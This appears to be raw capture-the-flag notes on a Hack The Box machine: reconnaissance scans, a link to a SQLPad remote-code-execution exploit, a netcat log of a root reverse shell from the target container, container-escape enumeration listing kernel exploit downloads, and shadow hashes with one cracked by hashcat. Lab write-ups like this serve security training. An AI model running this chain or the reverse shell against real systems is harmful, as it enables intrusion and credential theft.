nmap output:
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 10:53 CST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:53
Completed NSE at 10:53, 0.00s elapsed
Initiating NSE at 10:53
Completed NSE at 10:53, 0.00s elapsed
Initiating NSE at 10:53
Completed NSE at 10:53, 0.00s elapsed
Initiating Ping Scan at 10:53
Scanning sightless.htb (10.129.215.169) [4 ports]
Completed Ping Scan at 10:53, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:53
Scanning sightless.htb (10.129.215.169) [1000 ports]
Discovered open port 80/tcp on 10.129.215.169
Discovered open port 21/tcp on 10.129.215.169
Discovered open port 22/tcp on 10.129.215.169
Completed SYN Stealth Scan at 10:53, 0.49s elapsed (1000 total ports)
Initiating Service scan at 10:53
Scanning 3 services on sightless.htb (10.129.215.169)
Completed Service scan at 10:54, 28.64s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against sightless.htb (10.129.215.169)
Retrying OS detection (try #2) against sightless.htb (10.129.215.169)
Retrying OS detection (try #3) against sightless.htb (10.129.215.169)
Retrying OS detection (try #4) against sightless.htb (10.129.215.169)
Retrying OS detection (try #5) against sightless.htb (10.129.215.169)
Initiating Traceroute at 10:54
Completed Traceroute at 10:54, 0.03s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:54
Completed Parallel DNS resolution of 1 host. at 10:54, 0.00s elapsed
NSE: Script scanning 10.129.215.169.
Initiating NSE at 10:54
Completed NSE at 10:54, 10.31s elapsed
Initiating NSE at 10:54
Completed NSE at 10:54, 28.38s elapsed
Initiating NSE at 10:54
Completed NSE at 10:54, 0.00s elapsed
Nmap scan report for sightless.htb (10.129.215.169)
Host is up (0.029s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.129.215.169]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Sightless.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=11/15%Time=67377C9C%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,A3,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x2
SF:0Server\)\x20\[::ffff:10\.129\.215\.169\]\r\n500\x20Invalid\x20command:
SF:\x20try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20t
SF:ry\x20being\x20more\x20creative\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=11/15%OT=21%CT=1%CU=33225%PV=Y%DS=2%DC=T%G=Y%TM=673
OS:77CE0%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A
OS:)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53
OS:CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88
OS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
OS:0%CD=S)

Uptime guess: 24.580 days (since Mon Oct 21 21:59:40 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   29.06 ms 10.10.14.1
2   29.15 ms sightless.htb (10.129.215.169)

NSE: Script Post-scanning.
Initiating NSE at 10:54
Completed NSE at 10:54, 0.00s elapsed
Initiating NSE at 10:54
Completed NSE at 10:54, 0.00s elapsed
Initiating NSE at 10:54
Completed NSE at 10:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.90 seconds
           Raw packets sent: 1124 (53.442KB) | Rcvd: 1099 (48.135KB)
```

gobuster output:
```bash
/images               (Status: 301) [Size: 178] [--> http://sightless.htb/images/]
/icones               (Status: 301) [Size: 178] [--> http://sightless.htb/icones/]
/index.html           (Status: 200) [Size: 4993]
/.                    (Status: 200) [Size: 4993]
```

nikto output:
```bash
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.215.169
+ Target Hostname:    sightless.htb
+ Target Port:        80
+ Start Time:         2024-11-15 10:56:02 (GMT-6)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 7962 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2024-11-15 11:00:12 (GMT-6) (250 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

whatweb output:
```bash
WhatWeb report for http://sightless.htb
Status    : 200 OK
Title     : Sightless.htb
IP        : 10.129.215.169
Country   : RESERVED, ZZ

Summary   : Email[sales@sightless.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], Matomo, nginx[1.18.0], X-UA-Compatible[IE=edge]
```

cewl output:
```bash
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
Starting at http://sightless.htb
Visiting: http://sightless.htb, got response code 200
Attribute text found:
 

Found sales@sightless.htb on page mailto:sales@sightless.htb
Offsite link, not following: http://sqlpad.sightless.htb/
Offsite link, not following: https://www.froxlor.org/
Found sales@sightless.htb on page mailto:sales@sightless.htb
Writing words to file
Dumping email addresses to file

Sightless
server
management
Start
Contact
About
Services
database
solutions
databases
servers
seasoned
experience
services
SQLPad
Click
Froxlor
below
Hello
Empowering
Digital
Backbone
Welcome
premier
destination
comprehensive
Founded
mission
empower
businesses
seamless
efficient
infrastructure
dedicated
ensuring
always
optimized
secure
running
smoothly
understand
critical
today
digital
landscape
comprises
experts
years
administration
pride
ourselves
ability
provide
tailored
unique
needs
client
regardless
industry
Touch
service
section
start
users
connect
various
browser
Tailored
admin
software
Crafted
admins
streamlines
hosting
platform
Database
Server
Management
Providing
while
managing
systems
Interested
button
contact
sales
Footer
strat
Please
click
links
follow
CopyRight

Email addresses found
---------------------
sales@sightless.htb
```

sqlpad:
![image](https://github.com/user-attachments/assets/cb615dc1-b2d5-423c-980f-ece826eccd8e)

sqlpad rce: https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944

reverse shell output:
```bash
┌─[us-dedivip-1]─[10.10.14.34]─[bhugo97@htb-hdqjptsfjk]─[~]
└──╼ [★]$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.34] from (UNKNOWN) [10.129.215.169] 48768
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c184118df0a6:/var/lib/sqlpad# whoami
whoami
root
root@c184118df0a6:/var/lib/sqlpad# ls -lah
ls -lah
total 200K
drwxr-xr-x 4 root root 4.0K Nov 15 16:40 .
drwxr-xr-x 1 root root 4.0K Mar 12  2022 ..
drwxr-xr-x 2 root root 4.0K Aug  9 11:17 cache
drwxr-xr-x 2 root root 4.0K Aug  9 11:17 sessions
-rw-r--r-- 1 root root 184K Nov 15 18:35 sqlpad.sqlite
root@c184118df0a6:/home/node# cd /
cd /
root@c184118df0a6:/# ls
ls
bin
boot
dev
docker-entrypoint
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
root@c184118df0a6:/# cd docker-entrypoint
cd docker-entrypoint
bash: cd: docker-entrypoint: Not a directory
root@c184118df0a6:/# cat docker-entrypoint
cat docker-entrypoint
#!/bin/bash
set -e
# This iterates any sh file in the directory and executes them before our server starts
# Note: we intentionally source the files, allowing scripts to set vars that override default behavior.
if [ -d "/etc/docker-entrypoint.d" ]; then
    find /etc/docker-entrypoint.d -name '*.sh' -print0 | 
    while IFS= read -r -d '' line; do 
        . "$line"
    done
fi
exec node /usr/app/server.js $@
root@c184118df0a6:/# cd /usr/app
cd /usr/app
root@c184118df0a6:/usr/app# ls
ls
app.js
auth-strategies
config.dev.env
docker-compose.yml
drivers
generate-test-db-fixture.js
lib
middleware
migrations
models
node_modules
package-lock.json
package.json
public
routes
sequelize-db
server.js
test
typedefs.js
root@c184118df0a6:/usr/app# 
```

linpeas output:
```bash
```

cdk output:
```bash
[  Information Gathering - System Info  ]
2024/11/15 20:38:33 current dir: /tmp
2024/11/15 20:38:33 current user: root uid: 0 gid: 0 home: /root
2024/11/15 20:38:33 hostname: c184118df0a6
2024/11/15 20:38:33 debian debian 10.11 kernel: 5.15.0-119-generic
2024/11/15 20:38:33 Setuid files found:
	/usr/bin/chfn
	/usr/bin/chsh
	/usr/bin/gpasswd
	/usr/bin/newgrp
	/usr/bin/passwd
	/bin/mount
	/bin/su
	/bin/umount

[  Information Gathering - Services  ]

[  Information Gathering - Commands and Capabilities  ]
2024/11/15 20:38:33 available commands:
	wget,find,node,npm,apt,dpkg,mount,fdisk,base64,perl
2024/11/15 20:38:33 Capabilities hex of Caps(CapInh|CapPrm|CapEff|CapBnd|CapAmb):
	CapInh:	0000000000000000
	CapPrm:	00000000a00425fb
	CapEff:	00000000a00425fb
	CapBnd:	00000000a00425fb
	CapAmb:	0000000000000000
	Cap decode: 0x00000000a00425fb = CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_AUDIT_WRITE,CAP_SETFCAP
[*] Maybe you can exploit the Capabilities below:

[  Information Gathering - Mounts  ]
0:43 / / rw,relatime - overlay overlay rw,lowerdir=/var/lib/docker/overlay2/l/L7ZKMJGDPM66AJUMM7OC6R4AMF:/var/lib/docker/overlay2/l/VKDEY6G5NFPWPTGJ7CR42Y3IXX:/var/lib/docker/overlay2/l/PGKS4DZDXD3SDVXKFEFEVRO3XL:/var/lib/docker/overlay2/l/VASNMPQBW2LWLK5R4SANZMAN3V:/var/lib/docker/overlay2/l/BRMVIB4H7ZWJSKBWSXCZG6NQGH:/var/lib/docker/overlay2/l/TDTAZTZTTMIHP4ELLG5TFCVPGQ:/var/lib/docker/overlay2/l/SY7KKADEXBP67CATU6OKQJFEMH:/var/lib/docker/overlay2/l/24CLUQ3NX3M5V742R264CL7LO4:/var/lib/docker/overlay2/l/POC2FH3R7PG2AYOVS4CRB2C5JW:/var/lib/docker/overlay2/l/KRMAYQOJUIV2NXMWQCXF6IONRG:/var/lib/docker/overlay2/l/SUSVG6PVN2JR5B5SDTRKZZSSKO:/var/lib/docker/overlay2/l/AKVKTM4UQL4647ATG2NAYQCCFT,upperdir=/var/lib/docker/overlay2/9d0ce24f13f948e3582b108d503a1ae6025f910f0309225785c43ff85bbfa404/diff,workdir=/var/lib/docker/overlay2/9d0ce24f13f948e3582b108d503a1ae6025f910f0309225785c43ff85bbfa404/work
0:47 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw
0:48 / /dev rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
0:49 / /dev/pts rw,nosuid,noexec,relatime - devpts devpts rw,gid=5,mode=620,ptmxmode=666
0:50 / /sys ro,nosuid,nodev,noexec,relatime - sysfs sysfs ro
0:28 / /sys/fs/cgroup ro,nosuid,nodev,noexec,relatime - cgroup2 cgroup rw,nsdelegate,memory_recursiveprot
0:46 / /dev/mqueue rw,nosuid,nodev,noexec,relatime - mqueue mqueue rw
0:51 / /dev/shm rw,nosuid,nodev,noexec,relatime - tmpfs shm rw,size=65536k,inode64
253:0 /var/lib/docker/containers/c184118df0a6eb770d018766ef8e32c948924b0ba77d85ec04a32e50cbafcb3a/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
253:0 /var/lib/docker/containers/c184118df0a6eb770d018766ef8e32c948924b0ba77d85ec04a32e50cbafcb3a/hostname /etc/hostname rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
253:0 /var/lib/docker/containers/c184118df0a6eb770d018766ef8e32c948924b0ba77d85ec04a32e50cbafcb3a/hosts /etc/hosts rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
253:0 /root/docker-volumes/sqlpad-postgres /var/lib/sqlpad rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
0:47 /bus /proc/bus ro,nosuid,nodev,noexec,relatime - proc proc rw
0:47 /fs /proc/fs ro,nosuid,nodev,noexec,relatime - proc proc rw
0:47 /irq /proc/irq ro,nosuid,nodev,noexec,relatime - proc proc rw
0:47 /sys /proc/sys ro,nosuid,nodev,noexec,relatime - proc proc rw
0:47 /sysrq-trigger /proc/sysrq-trigger ro,nosuid,nodev,noexec,relatime - proc proc rw
0:52 / /proc/acpi ro,relatime - tmpfs tmpfs ro,inode64
0:48 /null /proc/kcore rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
0:48 /null /proc/keys rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
0:48 /null /proc/timer_list rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
0:53 / /proc/scsi ro,relatime - tmpfs tmpfs ro,inode64
0:54 / /sys/firmware ro,relatime - tmpfs tmpfs ro,inode64

[  Information Gathering - Net Namespace  ]
	container net namespace isolated.

[  Information Gathering - Sysctl Variables  ]
2024/11/15 20:38:33 net.ipv4.conf.all.route_localnet = 0

[  Information Gathering - DNS-Based Service Discovery  ]
error when requesting coreDNS: lookup any.any.svc.cluster.local. on 8.8.8.8:53: read udp 172.17.0.2:37763->8.8.8.8:53: i/o timeout
error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 8.8.8.8:53: read udp 172.17.0.2:41804->8.8.8.8:53: i/o timeout

[  Discovery - K8s API Server  ]
2024/11/15 20:39:13 checking if api-server allows system:anonymous request.
err found while searching local K8s apiserver addr.:
err: cannot find kubernetes api host in ENV
	api-server forbids anonymous request.
	response:

[  Discovery - K8s Service Account  ]
load K8s service account token error.:
open /var/run/secrets/kubernetes.io/serviceaccount/token: no such file or directory

[  Discovery - Cloud Provider Metadata API  ]
2024/11/15 20:39:14 failed to dial Alibaba Cloud API.
2024/11/15 20:39:15 failed to dial Azure API.
2024/11/15 20:39:16 failed to dial Google Cloud API.
2024/11/15 20:39:17 failed to dial Tencent Cloud API.
2024/11/15 20:39:18 failed to dial OpenStack API.
2024/11/15 20:39:19 failed to dial Amazon Web Services (AWS) API.
2024/11/15 20:39:20 failed to dial ucloud API.

[  Exploit Pre - Kernel Exploits  ]
2024/11/15 20:39:20 refer: https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded
```

deepce output:
```bash
==========================================( Colors )==========================================
[+] Exploit Test ............ Exploitable - Check this out
[+] Basic Test .............. Positive Result
[+] Another Test ............ Error running check
[+] Negative Test ........... No
[+] Multi line test ......... Yes
Command output
spanning multiple lines

Tips will look like this and often contains links with additional info. You can usually 
ctrl+click links in modern terminal to open in a browser window
See https://stealthcopter.github.io/deepce

===================================( Enumerating Platform )===================================
[+] Inside Container ........ Yes
[+] Container Platform ...... docker
[+] Container tools ......... None
[+] User .................... root
[+] Groups .................. root
[+] Sudoers ................. No
[+] Docker Executable ....... Not Found
[+] Docker Sock ............. Not Found
[+] Docker Version .......... Version Unknown
==================================( Enumerating Container )===================================
[+] Container ID ............ c184118df0a6
[+] Container Full ID ....... /
[+] Container Name .......... Could not get container name through reverse DNS
[+] Container IP ............ 172.17.0.2 
[+] DNS Server(s) ........... 1.1.1.1 8.8.8.8 
[+] Host IP ................. 172.17.0.1
[+] Operating System ........ GNU/Linux
[+] Kernel .................. 5.15.0-119-generic
[+] Arch .................... x86_64
[+] CPU ..................... AMD EPYC 7763 64-Core Processor
[+] Useful tools installed .. Yes
/usr/bin/wget
/bin/hostname
[+] Dangerous Capabilities .. capsh not installed, listing raw capabilities
libcap2-bin is required but not installed
apt install -y libcap2-bin

Current capabilities are:
CapInh:	0000000000000000
CapPrm:	00000000a00425fb
CapEff:	00000000a00425fb
CapBnd:	00000000a00425fb
CapAmb:	0000000000000000
> This can be decoded with: "capsh --decode=00000000a00425fb"
[+] SSHD Service ............ Unknown (ps not installed)
[+] Privileged Mode ......... No
====================================( Enumerating Mounts )====================================
[+] Docker sock mounted ....... No
[+] Other mounts .............. Yes
/root/docker-volumes/sqlpad-postgres /var/lib/sqlpad rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
[+] Possible host usernames ...  
====================================( Interesting Files )=====================================
[+] Interesting environment variables ... No
[+] Any common entrypoint files ......... Yes
-rwxr-xr-x 1 root root  413 Mar 12  2022 /docker-entrypoint
-rwxr-xr-x 1 root root  39K Nov 15 20:25 /tmp/deepce.sh
-rwxr-xr-x 1 root root 809K Nov  1 04:29 /tmp/linpeas.sh
[+] Interesting files in root ........... Yes
/docker-entrypoint
[+] Passwords in common files ........... No
[+] Home directories .................... total 8.0K
drwxr-xr-x 2 michael michael 4.0K Aug  9 09:42 michael
drwxr-xr-x 1 node    node    4.0K Aug  9 09:42 node
[+] Hashes in shadow file ............... Yes
$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.
$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/
[+] Searching for app dirs .............. 
==================================( Enumerating Containers )==================================
By default containers can communicate with other containers on the same network and the 
host machine, this can be used to enumerate further

Could not ping sweep, requires nmap or ping to be executable
==============================================================================================
```

tcp ports output:
```bash
root@c184118df0a6:/proc/sys/kernel# cat /proc/net/tcp | awk 'NR>1 {print $2}' | cut -d':' -f2 | xargs -I{} printf "%d\n" 0x{}
<2}' | cut -d':' -f2 | xargs -I{} printf "%d\n" 0x{}
3000
49048
34970
```

hashcat output:
```bash
$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa....L2IJD/
Time.Started.....: Fri Nov 15 19:27:22 2024 (17 secs)
Time.Estimated...: Fri Nov 15 19:27:39 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (./password-wordlist-2.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     4032 H/s (50.04ms) @ Accel:1024 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 69632/31305949 (0.22%)
Rejected.........: 0/69632 (0.00%)
Restore.Point....: 68608/31305949 (0.22%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4096-5000
Candidate.Engine.: Device Generator
Candidates.#1....: waves -> broughton
Hardware.Mon.#1..: Temp: 59c Util: 96%

Started: Fri Nov 15 19:27:19 2024
Stopped: Fri Nov 15 19:27:41 2024
```
